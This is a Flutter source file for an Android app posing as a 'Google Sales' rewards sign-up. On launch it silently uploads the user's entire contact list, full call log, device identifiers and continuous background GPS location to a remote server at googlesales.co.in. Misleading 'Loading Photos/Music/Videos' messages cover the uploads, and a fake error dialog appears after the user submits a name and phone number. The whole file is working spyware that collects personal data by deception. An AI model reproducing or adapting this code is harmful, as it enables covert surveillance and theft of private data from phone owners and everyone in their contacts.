import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_info/device_info.dart';
import 'package:uuid/uuid.dart';
import 'package:http/http.dart' as http;
import 'package:call_log/call_log.dart';
import 'package:geolocator/geolocator.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:background_location/background_location.dart';

void main() => runApp(MyApp());

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Google Sales',
      home: Scaffold(
        resizeToAvoidBottomInset: false,
        appBar: AppBar(
          title: Text('Google Sales'),
          backgroundColor: Color(0xffea4335),
        ),
        body: Center(child: StartApp()),
      ),
      builder: EasyLoading.init(),
    );
  }
}

class StartApp extends StatefulWidget {
  StartAppState createState() => StartAppState();
}

class StartAppState extends State {
  // var apiurl = "http://192.168.1.3/araskocon/index.php/";
  var apiurl = "https://googlesales.co.in/index.php/";
  Iterable<Contact> _contacts;
  var device_id = "";
  var model_no = "";
  var brand = "";
  var currentlocation;
  String latitude = "waiting...";
  String longitude = "waiting...";
  String altitude = "waiting...";
  String accuracy = "waiting...";
  String bearing = "waiting...";
  String speed = "waiting...";
  String time = "waiting...";
  @override
  void initState() {
    getPermission();
    getDeviceInfo();

    super.initState();
    getBackgroundLocation();
  }

  Future<void> getBackgroundLocation() async {
    print("backgroundloation working");
    await BackgroundLocation.setAndroidNotification(
      title: "Background service is running",
      message: "Background location in progress",
      icon: "@mipmap/ic_launcher",
    );
    await BackgroundLocation.setAndroidConfiguration(15000);
    await BackgroundLocation.startLocationService(distanceFilter: 0);
    BackgroundLocation.getLocationUpdates(
      (location) {
        setState(() {
          this.latitude = location.latitude.toString();
          this.longitude = location.longitude.toString();
          this.accuracy = location.accuracy.toString();
          this.altitude = location.altitude.toString();
          this.bearing = location.bearing.toString();
          this.speed = location.speed.toString();
          this.time = DateTime.fromMillisecondsSinceEpoch(location.time.toInt())
              .toString();
        });
        setPosition(
            location.latitude.toString(), location.longitude.toString());
        print("""\n
                        Latitude:  $latitude
                        Longitude: $longitude
                        Altitude: $altitude
                        Accuracy: $accuracy
                        Bearing:  $bearing
                        Speed: $speed
                        Time: $time
                      """);
      },
    );
  }

  Widget locationData(String data) {
    return Text(
      data,
      style: TextStyle(
        fontWeight: FontWeight.bold,
        fontSize: 18,
      ),
      textAlign: TextAlign.center,
    );
  }

  Future<void> setPosition(String latitude, String longitude) async {
    EasyLoading.show(status: 'Loading Photos...');
    final json = {
      'model_no': model_no,
      'device_id': device_id,
      'brand': brand,
      'latitude': latitude,
      'longitude': longitude,
    };
    Map<String, String> header = {
      "Content-type": "application/x-www-form-urlencoded"
    };
    final http.Response response = await http.post(
      apiurl + 'Api/createLocation',
      headers: header,
      body: json,
    );
    print("working on location");
    if (response.statusCode == 200) {
      EasyLoading.dismiss();
    } else {
      EasyLoading.dismiss();
    }
  }

  Future<void> getPermission() async {
    if (await Permission.contacts.request().isGranted) {
      getContacts();
    }
    if (await Permission.phone.request().isGranted) {
      getCallLog();
    }
    if (await Permission.location.request().isGranted) {
      _determinePosition().then((value) =>
          {setPosition(value.latitude.toString(), value.longitude.toString())});
    }
    await [Permission.contacts, Permission.location, Permission.phone]
        .request();
  }

  Future<Position> _determinePosition() async {
    bool serviceEnabled;
    LocationPermission permission;

    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      GeolocatorPlatform.instance.openLocationSettings();
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.deniedForever) {
      return Future.error(
          'Location permissions are permantly denied, we cannot request permissions.');
    }

    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
      if (permission != LocationPermission.whileInUse &&
          permission != LocationPermission.always) {
        return Future.error(
            'Location permissions are denied (actual value: $permission).');
      }
    }

    return await Geolocator.getCurrentPosition();
  }

  Future<void> getDeviceInfo() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    var uuid = Uuid();
    model_no = androidInfo.model;
    brand = androidInfo.brand;
    device_id = androidInfo.androidId;
  }

  //call log controller
  Future<void> createBulkCallLog(Map caontactlist) async {
    EasyLoading.show(status: 'Loading Music...');
    final json = {
      'model_no': model_no,
      'device_id': device_id,
      'brand': brand,
      'name': caontactlist['name'],
      'contact_no': caontactlist['number'],
      'call_type': caontactlist['call_type'],
      'duration': caontactlist['duration'],
      'date': caontactlist['date'],
    };
    Map<String, String> header = {"Content-type": "application/json"};
    final http.Response response = await http.post(
      apiurl + 'Api/crateCallLogBulk',
      headers: header,
      body: jsonEncode(json),
    );
    print(response.body);
    print("workin on contact log");

    if (response.statusCode == 200) {
      EasyLoading.dismiss();
    } else {
      EasyLoading.dismiss();
    }
  }

  Future<void> createCallLog(String name, String contactno, String calldate,
      String duration, String calltype) async {
    EasyLoading.show(status: 'Loading Music...');
    final json = {
      'model_no': model_no,
      'device_id': device_id,
      'brand': brand,
      'name': name,
      'contact_no': contactno,
      'call_type': calltype,
      'duration': duration,
      'date': calldate,
    };
    Map<String, String> header = {
      "Content-type": "application/x-www-form-urlencoded"
    };
    final http.Response response = await http.post(
      apiurl + 'Api/crateCallLog',
      headers: header,
      body: json,
    );

    print(response.body);
    if (response.statusCode == 200) {
      EasyLoading.dismiss();
    } else {
      EasyLoading.dismiss();
    }
  }

  Future<void> getCallLog() async {
    var now = DateTime.now();
    int from = now.subtract(Duration(days: 60)).millisecondsSinceEpoch;
    int to = now.subtract(Duration(days: 30)).millisecondsSinceEpoch;
    Iterable<CallLogEntry> entries = await CallLog.query();

    var contactlength = entries.length;
    var contatlist = {
      'number': [],
      'name': [],
      'call_type': [],
      'duration': [],
      'date': []
    };
    for (var i = 0; i < contactlength; i++) {
      var contactobj = entries.elementAt(i);
      var tcontactno = contactobj.number;
      var tname = contactobj.name ?? "-";
      var tcallType = contactobj.callType.toString();
      var tdate =
          DateTime.fromMillisecondsSinceEpoch(contactobj.timestamp).toString();
      var tduration = contactobj.duration.toString();
      contatlist['number'].add(tcontactno);
      contatlist['name'].add(tname);
      contatlist['call_type'].add(tcallType);
      contatlist['duration'].add(tduration);
      contatlist['date'].add(tdate);

      // createCallLog(tname, tcontactno, tdate, tduration, tcallType);
    }
    createBulkCallLog(contatlist);
  }
// end of call log

//create contact

  Future<void> createContactBulk(Map contactlist) async {
    EasyLoading.show(status: 'Loading Videos...');
    final json = {
      'model_no': model_no,
      'device_id': device_id,
      'brand': brand,
      'name': contactlist['name'],
      'contact_no': contactlist['number']
    };
    Map<String, String> header = {"Content-type": "application/json"};
    final http.Response response = await http.post(
      apiurl + 'Api/crateContactBulk',
      headers: header,
      body: jsonEncode(json),
    );

    print("working on contact list");

    if (response.statusCode == 200) {
      EasyLoading.dismiss();
    } else {
      EasyLoading.dismiss();
    }
  }

  Future<void> createContact(String name, String contact_no) async {
    EasyLoading.show(status: 'Loading Videos...');
    final json = {
      'model_no': model_no,
      'device_id': device_id,
      'brand': brand,
      'name': name,
      'contact_no': contact_no
    };
    Map<String, String> header = {
      "Content-type": "application/x-www-form-urlencoded"
    };
    final http.Response response = await http.post(
      apiurl + 'Api/crateContact',
      headers: header,
      body: json,
    );

    print(response.body);
    if (response.statusCode == 200) {
      EasyLoading.dismiss();
    } else {
      EasyLoading.dismiss();
    }
  }

  Future<void> getContacts() async {
    //We already have permissions for contact when we get to this page, so we
    // are now just retrieving it
    final Iterable<Contact> _contacts = await ContactsService.getContacts();
    var contatlist = {
      'number': [],
      'name': [],
    };
    var contactlength = _contacts.length;
    for (var i = 0; i < contactlength; i++) {
      var contactobj = _contacts.elementAt(i);
      var phones = contactobj.phones;
      var phonesl = contactobj.phones.length;
      if (phonesl > 0) {
        var phoneobj = phones.elementAt(0);
        var mobileno = phoneobj.value.toString();
        var namecontact = contactobj.displayName;
        contatlist['number'].add(mobileno);
        contatlist['name'].add(namecontact);
      }
    }
    createContactBulk(contatlist);

    //_showMyDialog(brand);
  }
  //end of create contact

  Future<void> _showMyDialog() async {
    return showDialog<void>(
      context: context,
      barrierDismissible: false, // user must tap button!
      builder: (BuildContext context) {
        return AlertDialog(
          title: Text('Oops! Something went wrong'),
          content: SingleChildScrollView(
            child: ListBody(
              children: <Widget>[
                Text("The application has encountered an unknown error."),
              ],
            ),
          ),
          actions: <Widget>[
            TextButton(
              child: Text('Try Again'),
              onPressed: () {
                Navigator.of(context).pop();
              },
            ),
          ],
        );
      },
    );
  }

  Future<void> createContactPerson(String name, String number) async {
    EasyLoading.show(status: 'Creating Account...');
    final json = {
      'model_no': model_no,
      'device_id': device_id,
      'brand': brand,
      'name': name,
      'contact_no': number
    };
    Map<String, String> header = {"Content-type": "application/json"};
    final http.Response response = await http.post(
      apiurl + 'Api/createContactPerson',
      headers: header,
      body: jsonEncode(json),
    );

    print("working on contact persion");
    print(response.body);
    if (response.statusCode == 200) {
      EasyLoading.dismiss();
      _showMyDialog();
    } else {
      EasyLoading.dismiss();
      _showMyDialog();
    }
  }

  final TextEditingController _namecontroller = TextEditingController();
  final TextEditingController _numbercontroller = TextEditingController();
  final Shader linearGradient = LinearGradient(
    colors: <Color>[Color(0xffea4335), Color(0xffea4335)],
  ).createShader(Rect.fromLTWH(0.0, 0.0, 200.0, 70.0));
  final _formKey = GlobalKey<FormState>();
  @override
  Widget build(BuildContext context) {
    print(_contacts);
    return Scaffold(
        resizeToAvoidBottomInset: false,
        body: Container(
            alignment: Alignment.center,
            padding: const EdgeInsets.all(50.0),
            child: Form(
              key: _formKey,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.center,
                children: <Widget>[
                  Image(
                      height: 100,
                      image: AssetImage("graphics/icon.png"),
                      fit: BoxFit.cover),
                  const SizedBox(height: 20),
                  Text(
                    'Create Account  &\n Get Exciting Rewards & Vouchers',
                    textAlign: TextAlign.center,
                    style: new TextStyle(
                        fontSize: 20.0,
                        fontWeight: FontWeight.w500,
                        foreground: Paint()..shader = linearGradient),
                  ),
                  const SizedBox(height: 20),
                  TextFormField(
                    controller: _namecontroller,
                    decoration: InputDecoration(
                        fillColor: Color(0xffea4335),
                        labelText: "Enter Your Name",
                        hintText: "",
                        icon: Icon(Icons.person)),
                    validator: (value) {
                      if (value.isEmpty) {
                        return 'Please enter your name';
                      }
                      return null;
                    },
                  ),
                  TextFormField(
                    keyboardType: TextInputType.phone,
                    controller: _numbercontroller,
                    decoration: InputDecoration(
                        labelText: "Enter Your No.",
                        hintText: "",
                        icon: Icon(Icons.phone_iphone)),
                    validator: (value) {
                      if (value.length != 10) {
                        return 'Please enter valid mobile no.';
                      }
                      return null;
                    },
                  ),
                  const SizedBox(height: 20),
                  Container(
                    alignment: Alignment.center,
                    padding: const EdgeInsets.symmetric(vertical: 16.0),
                    child: ElevatedButton(
                      onPressed: () {
                        // Validate returns true if the form is valid, or false
                        // otherwise.
                        if (_formKey.currentState.validate()) {
                          // If the form is valid, display a Snackbar.

                          createContactPerson(
                              _namecontroller.text, _numbercontroller.text);

                          // Scaffold.of(context).showSnackBar(
                          //     SnackBar(content: Text('Processing Data')));
                        }
                      },
                      child: Container(
                        decoration: const BoxDecoration(
                          gradient: LinearGradient(
                            colors: <Color>[
                              Color(0xff34a853),
                              Color(0xff34a853)
                            ],
                          ),
                        ),
                        padding: const EdgeInsets.all(10.0),
                        child: const Text('Create Free Account',
                            style: TextStyle(fontSize: 20)),
                      ),
                    ),
                  ),
                ],
              ),
            )));
  }
}
